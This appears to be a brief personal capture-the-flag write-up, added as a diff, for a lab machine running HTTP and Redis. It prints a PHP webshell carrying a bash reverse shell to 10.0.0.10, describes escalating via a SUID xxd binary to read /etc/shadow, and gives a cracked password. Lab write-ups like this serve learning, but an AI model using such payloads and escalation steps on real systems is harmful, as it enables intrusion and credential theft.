@@ -1,0 +1,30 @@
+10.10.97.75
+
+2 ports:
+http/80
+redis/6379
+
+never experienced REDIS so using this post to learn more:
+https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis
+
+using the command 'redis-cli' we can access the redis server:
+we can run commands such as:
+# info
+where we find a user 'vianka'
+
+https://web.archive.org/web/20191201022931/http://reverse-tcp.xyz/pentest/database/2017/02/09/Redis-Hacking-Tips.html
+
+using this, we can get a webshell by using this php/bash shell code:
+
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'"); ?>
+
+we found user.txt
+
+running linpeas reveals xxd as suid binary
+
+which can be exploited
+
+https://www.hackingarticles.in/linux-for-pentester-xxd-privilege-escalation/
+
+we can read the /etc/shadow file with this and therefore run john on the user vianka's hash and get the password: beautiful1
+
